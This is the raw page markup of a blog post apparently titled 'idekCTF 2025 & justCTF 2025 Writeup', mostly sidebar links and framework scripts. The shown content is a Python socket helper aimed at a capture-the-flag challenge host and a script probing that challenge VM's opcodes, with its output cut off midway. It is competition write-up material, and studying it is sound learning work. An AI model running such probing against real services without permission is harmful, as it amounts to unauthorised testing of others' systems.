href="/24a/csp-2023-05/"><span>CSP 202305 T1-T5题解</span></a></li><li><a class="link" href="/24a/csp-2023-09/"><span>CSP 202309 T1-T4题解</span></a></li><li><a class="link" href="/24b/leetcode-4/"><span>LeetCode 4.寻找两个正序数组的中位数</span></a></li><li><a class="link" href="/24b/leetcode-30/"><span>LeetCode 30.串联所有单词的子串</span></a></li><li><a class="link" href="/24b/leetcode-37/"><span>LeetCode 37.解数独</span></a></li><li><a class="link" href="/24c/leetcode-42/"><span>LeetCode 42.接雨水</span></a></li><li><a class="link" href="/24c/leetcode-51/"><span>LeetCode 51.N皇后</span></a></li><li><a class="link" href="/24c/leetcode-52/"><span>LeetCode 52.N皇后 II</span></a></li><li><a class="link" href="/24b/leetcode-60/"><span>LeetCode 60.排列序列</span></a></li><li><a class="link" href="/24b/leetcode-65/"><span>LeetCode 65.有效数字</span></a></li><li><a class="link" href="/24c/leetcode-68/"><span>LeetCode 68.文本左右对齐</span></a></li><li><a class="link" href="/24b/leetcode-84/"><span>LeetCode 84.柱状图中最大的矩形</span></a></li><li><a class="link" href="/24c/leetcode-85/"><span>LeetCode 85.最大矩形</span></a></li><li><a class="link" href="/24c/leetcode-149/"><span>LeetCode 149.直线上最多的点数</span></a></li><li><a class="link" href="/24d/leetcode-282/"><span>LeetCode 282.给表达式添加运算符</span></a></li><li><a class="link" href="/24b/leetcode-312/"><span>LeetCode 312.戳气球</span></a></li><li><a class="link" href="/24b/leetcode-1373/"><span>LeetCode 1373.二叉搜索子树的最大键值和</span></a></li><li><a class="link" href="/24b/leetcode-1739/"><span>LeetCode 1739.放置盒子</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">深度学习<!-- --> (<!-- -->7<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/23d/r2plus1d/"><span>行为识别R(2+1)D网络</span></a></li><li><a class="link" href="/23d/object-detection-map/"><span>目标检测评价指标mAP</span></a></li><li><a class="link" href="/23d/learn-rnn-lstm/"><span>学习RNN和LSTM</span></a></li><li><a class="link" href="/24a/reproduce-nerf-rpn/"><span>记录：复现NeRF-RPN代码</span></a></li><li><a class="link" href="/24b/yolov5-obb-nms-rotated/"><span>解决：nms_rotated报错&quot;THC/THC.h&quot;: No such file or directory</span></a></li><li><a class="link" href="/24c/winograd/"><span>Winograd算法</span></a></li><li><a class="link" href="/24c/model-optimization/"><span>模型优化概述：量化、压缩、轻量化</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">编程语言<!-- --> (<!-- -->6<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/23c/js-array/"><span>JavaScript数组常用方法</span></a></li><li><a class="link" href="/24a/cpp-stl/"><span>C++中STL的基本使用</span></a></li><li><a class="link" href="/24a/torch-numpy-topk/"><span>在pytorch和numpy中取top-k值和索引</span></a></li><li><a class="link" href="/24a/object-oriented-programming-python/"><span>Python面向对象编程</span></a></li><li><a class="link" href="/24c/asm8086-snake/"><span>8086汇编贪吃蛇</span></a></li><li><a class="link" href="/25c/python-decorator/"><span>Python装饰器</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">前端<!-- --> (<!-- -->2<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/23d/css-auto-height-transition/"><span>CSS实现auto高度的过渡动画</span></a></li><li><a class="link" href="/24d/android-send-explicit-intent-to-dynamically-registered-receiver/"><span>不能向动态注册的广播接收器发送显式Intent</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">课程笔记<!-- --> (<!-- -->18<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24b/rank-inequality/"><span>【线性代数】对秩不等式的理解</span></a></li><li><a class="link" href="/23c/pattern-recognition-1/"><span>【模式识别】统计决策方法</span></a></li><li><a class="link" href="/23c/pattern-recognition-2/"><span>【模式识别】参数估计</span></a></li><li><a class="link" href="/23c/pattern-recognition-3/"><span>【模式识别】非参数估计</span></a></li><li><a class="link" href="/23d/pattern-recognition-4/"><span>【模式识别】线性学习器与线性分类器</span></a></li><li><a class="link" href="/23d/protocols/"><span>【计算机网络】协议总结</span></a></li><li><a class="link" href="/24a/machine-learning-exercises/"><span>【机器学习】习题</span></a></li><li><a class="link" href="/24a/games101-01-transformation/"><span>【GAMES101】Transformation</span></a></li><li><a class="link" href="/24a/games101-02-rasterization/"><span>【GAMES101】Rasterization</span></a></li><li><a class="link" href="/24a/games101-03-shading/"><span>【GAMES101】Shading</span></a></li><li><a class="link" href="/24a/games101-04-geometry/"><span>【GAMES101】Geometry</span></a></li><li><a class="link" href="/24c/assembly-1/"><span>【汇编语言】访问寄存器和内存</span></a></li><li><a class="link" href="/24c/assembly-2/"><span>【汇编语言】汇编语言编程</span></a></li><li><a class="link" href="/24c/assembly-3/"><span>【汇编语言】内存寻址方式</span></a></li><li><a class="link" href="/24c/assembly-4/"><span>【汇编语言】流程转移与子程序</span></a></li><li><a class="link" href="/24c/assembly-5/"><span>【汇编语言】标志寄存器</span></a></li><li><a class="link" href="/24c/assembly-6/"><span>【汇编语言】中断及外部设备操作</span></a></li><li><a class="link" href="/24d/crypto-1/"><span>【密码学】流密码</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">杂记<!-- --> (<!-- -->3<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24b/by-questions/"><span>专业课复习</span></a></li><li><a class="link" href="/longtime/hundred-thousand/"><span>十万</span></a></li><li><a class="link" href="/longtime/linux-commands/"><span>三开</span></a></li></ul></div></div></div></div><div id="sidebar-mask"></div></div><script src="/_next/static/chunks/webpack-56ee71d079d69944.js" crossorigin="" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/css/268aef745a7b3740.css\",\"style\",{\"crossOrigin\":\"\"}]\n0:\"$L2\"\n"])</script><script>self.__next_f.push([1,"3:HL[\"/_next/static/css/3bc7e8f21884ab46.css\",\"style\",{\"crossOrigin\":\"\"}]\n4:HL[\"/_next/static/css/82b97b807ab55020.css\",\"style\",{\"crossOrigin\":\"\"}]\n"])</script><script>self.__next_f.push([1,"5:I[47690,[],\"\"]\n7:I[55329,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"120\",\"static/chunks/120-aab2c7424ca78adb.js\",\"842\",\"static/chunks/842-dce450cd96773e9f.js\",\"318\",\"static/chunks/app/(posts)/%5B...slug%5D/page-e9e759b7bbaf69d2.js\"],\"\"]\n8:I[76842,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"120\",\"static/chunks/120-aab2c7424ca78adb.js\",\"842\",\"static/chunks/842-dce450cd96773e9f.js\",\"318\",\"static/chunks/app/(posts)/%5B...slug%5D/page-e9e759b7bbaf69d2.js\"],\"PostMeta\"]\n9:\"$Sreact.suspense\"\nb:I[76842,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"120\",\"static/chunks/120-aab2c7424ca78adb.js\",\"842\",\"static/chunks/842-dce450cd96773e9f.js\",\"318\",\"static/chunks/app/(posts)/%5B...slug%5D/page-e9e759b7bbaf69d2.js\"],\"LikeButton\"]\nc:I[5613,[],\"\"]\ne:I[31778,[],\"\"]\nf:I[89806,[\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"372\",\"static/chunks/372-d4ef474e704f1afd.js\",\"993\",\"static/chunks/app/(posts)/layout-e15e5287e741ad91.js\"],\"\"]\n10:I[25694,[\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"185\",\"static/chunks/app/layout-8f33aca7be8ff34b.js\"],\"GlobalProvider\"]\n11:I[30397,[\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"185\",\"static/chunks/app/layout-8f33aca7be8ff34b.js\"],\"\"]\n13:I[48955,[],\"\"]\nd:[\"slug\",\"25c/wp-idekctf-justctf-2025\",\"c\"]\n14:[]\n"])</script><script>self.__next_f.push([1,"2:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/268aef745a7b3740.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]],[\"$\",\"$L5\",null,{\"buildId\":\"0wU0bGg-i0jYBeP716xqR\",\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/25c/wp-idekctf-justctf-2025/\",\"initialTree\":[\"\",{\"children\":[\"(posts)\",{\"children\":[[\"slug\",\"25c/wp-idekctf-justctf-2025\",\"c\"],{\"children\":[\"__PAGE__?{\\\"slug\\\":[\\\"25c\\\",\\\"wp-idekctf-justctf-2025\\\"]}\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"(posts)\",{\"children\":[[\"slug\",\"25c/wp-idekctf-justctf-2025\",\"c\"],{\"children\":[\"__PAGE__\",{},[\"$L6\",[[\"$\",\"$L7\",null,{}],false,[\"$\",\"h1\",null,{\"className\":\"x-post-title\",\"children\":\"idekCTF 2025 \u0026 justCTF 2025 Writeup\"}],[\"$\",\"$L8\",null,{\"path\":\"/25c/wp-idekctf-justctf-2025/\"}],[\"$\",\"$9\",null,{\"fallback\":[\"$\",\"p\",null,{\"children\":\"Loading component...\"}],\"children\":\"$La\"}],[\"$\",\"$Lb\",null,{\"path\":\"/25c/wp-idekctf-justctf-2025/\"}]],null]]},[\"$\",\"$Lc\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"(posts)\",\"children\",\"$d\",\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Le\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"styles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/82b97b807ab55020.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]]}]]},[null,[\"$\",\"div\",null,{\"id\":\"post-layout\",\"children\":[[\"$\",\"div\",null,{\"id\":\"main\",\"className\":\"center-wrapper\",\"children\":[\"$\",\"$Lc\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"(posts)\",\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Le\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"styles\":null}]}],[\"$\",\"$Lf\",null,{}]]}],null]]},[null,[\"$\",\"html\",null,{\"lang\":\"zh-CN\",\"suppressHydrationWarning\":true,\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\"}],[\"$\",\"script\",null,{\"async\":true,\"src\":\"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\"}],[\"$\",\"script\",null,{\"async\":true,\"src\":\"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY\"}],[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\\nwindow.dataLayer = window.dataLayer || [];\\nfunction gtag() {\\n    dataLayer.push(arguments);\\n}\\ngtag('js', new Date());\\ngtag('config', 'G-45BYSZ6WPY');\\n\"}}],[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"const a=z=\u003eh.getItem(z),b=(y,z)=\u003eh.setItem(y,z),c=(y,z)=\u003edocument.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e\u0026\u0026a(d)!==f\u0026\u0026b(d,f);a(d)===e?c(g,e):c(g,f);\"}}],[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\\nif (!Array.prototype.findLast) {\\n    Array.prototype.findLast = function (callback) {\\n        for (let i = this.length - 1; i \u003e= 0; i--) {\\n            if (callback(this[i])) return this[i];\\n        }\\n        return undefined;\\n    };\\n}\\nif (!Array.prototype.findLastIndex) {\\n    Array.prototype.findLastIndex = function (callback) {\\n        for (let i = this.length - 1; i \u003e= 0; i--) {\\n            if (callback(this[i])) return i;\\n        }\\n        return -1;\\n    };\\n}\\n\"}}]]}],[\"$\",\"body\",null,{\"children\":[\"$\",\"$L10\",null,{\"children\":[[\"$\",\"$L11\",null,{}],[\"$\",\"$Lc\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Le\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[\"$\",\"div\",null,{\"id\":\"notfound\",\"children\":[[\"$\",\"img\",null,{\"alt\":\"img\",\"src\":\"/images/cry.gif\"}],[\"$\",\"code\",null,{\"id\":\"notfound-404\",\"children\":\"404\"}],[\"$\",\"code\",null,{\"id\":\"notfound-text\",\"children\":\"Page Not Found\"}]]}],\"notFoundStyles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/98e601cf5ba3633d.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]],\"styles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/3bc7e8f21884ab46.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]]}]]}]}]]}],null]],\"initialHead\":[false,\"$L12\"],\"globalErrorComponent\":\"$13\",\"missingSlots\":\"$W14\"}]]\n"])</script><script>self.__next_f.push([1,"15:I[62029,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"120\",\"static/chunks/120-aab2c7424ca78adb.js\",\"842\",\"static/chunks/842-dce450cd96773e9f.js\",\"318\",\"static/chunks/app/(posts)/%5B...slug%5D/page-e9e759b7bbaf69d2.js\"],\"\"]\n21:I[74365,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"120\",\"static/chunks/120-aab2c7424ca78adb.js\",\"842\",\"static/chunks/842-dce450cd96773e9f.js\",\"318\",\"static/chunks/app/(posts)/%5B...slug%5D/page-e9e759b7bbaf69d2.js\"],\"\"]\n16:T1597,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e functools\n\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e socket\n\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e time\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003eretry\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003emax_retries\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token number\"\u003e3\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003einner_decorator\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003efunc\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token decorator annotation punctuation\"\u003e@functools\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ewraps\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003efunc\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003ewrapper\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003eargs\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            retries \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ewhile\u003c/span\u003e retries \u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003e max_retries\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n                \u003cspan class=\"token keyword\"\u003etry\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n                    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e func\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003eargs\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n                \u003cspan class=\"token keyword\"\u003eexcept\u003c/span\u003e Exception\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n                    retries \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\n                    time\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esleep\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNone\u003c/span\u003e\n\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e wrapper\n\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e inner_decorator\n\n\n\u003cspan class=\"token decorator annotation punctuation\"\u003e@retry\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003emax_retries\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token number\"\u003e5\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003esend\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token builtin\"\u003eisinstance\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token builtin\"\u003estr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eencode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"latin1\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eassert\u003c/span\u003e \u003cspan class=\"token builtin\"\u003eisinstance\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token builtin\"\u003ebytes\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    s \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e socket\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esocket\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003esocket\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eAF_INET\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e socket\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eSOCK_STREAM\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    s\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esettimeout\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    s\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003econnect\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"lazy-vm.chal.idek.team\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e1337\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    s\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecv\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1024\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    s\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecv\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1024\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    s\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esend\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    result \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e s\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecv\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1024\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    s\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eclose\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e result\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003edecode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003estrip\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"17:Tfd7,"])</script><script>self.__next_f.push([1,"from challengeio import send\n\nfor i in range(10):\n    print(f\"Instruction {i}:\")\n    for opt in [\"\\x00\\x00\", \"\\x04\\x00\", \"\\x08\\x00\", \"\\x99\\x00\",\n                \"\\x04\\x06\\x00\", \"\\x04\\x99\\x00\", \"\\x99\\x06\\x00\", \"\\x99\\x99\\x00\"]:\n        payload = bytes([i]) + opt.encode(\"latin1\")\n        print(payload + b\"\\n\", send(payload))\n    print(\"========\")\n\n\"\"\"\nInstruction 0:\nb'\\x00\\x00\\x00\\n' Thanks for playing\nb'\\x00\\x04\\x00\\n' Thanks for playing\nb'\\x00\\x08\\x00\\n' Thanks for playing\nb'\\x00\\x99\\x00\\n' Thanks for playing\nb'\\x00\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x00\\x04\\x99\\x00\\n' Thanks for playing\nb'\\x00\\x99\\x06\\x00\\n' Thanks for playing\nb'\\x00\\x99\\x99\\x00\\n' Thanks for playing\n========\nInstruction 1:\nb'\\x01\\x00\\x00\\n' Thanks for playing\nb'\\x01\\x04\\x00\\n' Thanks for playing\nb'\\x01\\x08\\x00\\n' Thanks for playing\nb'\\x01\\x99\\x00\\n' Thanks for playing\nb'\\x01\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x01\\x04\\x99\\x00\\n' Unknown instruction at ip=0x2\nb'\\x01\\x99\\x06\\x00\\n' Thanks for playing\nb'\\x01\\x99\\x99\\x00\\n' Unknown instruction at ip=0x2\n========\nInstruction 2:\nb'\\x02\\x00\\x00\\n' Thanks for playing\nb'\\x02\\x04\\x00\\n' Thanks for playing\nb'\\x02\\x08\\x00\\n' reg index out of range\nb'\\x02\\x99\\x00\\n' reg index out of range\nb'\\x02\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x02\\x04\\x99\\x00\\n' Unknown instruction at ip=0x2\nb'\\x02\\x99\\x06\\x00\\n' reg index out of range\nb'\\x02\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 3:\nb'\\x03\\x00\\x00\\n' Thanks for playing\nb'\\x03\\x04\\x00\\n' Thanks for playing\nb'\\x03\\x08\\x00\\n' reg index out of range\nb'\\x03\\x99\\x00\\n' reg index out of range\nb'\\x03\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x03\\x04\\x99\\x00\\n' Unknown instruction at ip=0x2\nb'\\x03\\x99\\x06\\x00\\n' reg index out of range\nb'\\x03\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 4:\nb'\\x04\\x00\\x00\\n' Thanks for playing\nb'\\x04\\x04\\x00\\n' Thanks for playing\nb'\\x04\\x08\\x00\\n' reg index out of range\nb'\\x04\\x99\\x00\\n' reg index out of range\nb'\\x04\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x04\\x04\\x99\\x00\\n' Unknown instruction at ip=0x2\nb'\\x04\\x99\\x06\\x00\\n' reg index out of range\nb'\\x04\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 5:\nb'\\x05\\x00\\x00\\n' Thanks for playing\nb'\\x05\\x04\\x00\\n' Thanks for playing\nb'\\x05\\x08\\x00\\n' reg index out of range\nb'\\x05\\x99\\x00\\n' reg index out of range\nb'\\x05\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x05\\x04\\x99\\x00\\n' Unknown instruction at ip=0x2\nb'\\x05\\x99\\x06\\x00\\n' reg index out of range\nb'\\x05\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 6:\nb'\\x06\\x00\\x00\\n' Unknown instruction at ip=0x3\nb'\\x06\\x04\\x00\\n' Unknown instruction at ip=0x3\nb'\\x06\\x08\\x00\\n' reg index out of range\nb'\\x06\\x99\\x00\\n' reg index out of range\nb'\\x06\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x06\\x04\\x99\\x00\\n' Thanks for playing\nb'\\x06\\x99\\x06\\x00\\n' reg index out of range\nb'\\x06\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 7:\nb'\\x07\\x00\\x00\\n' Unknown instruction at ip=0x3\nb'\\x07\\x04\\x00\\n' Unknown instruction at ip=0x3\nb'\\x07\\x08\\x00\\n' Unknown instruction at 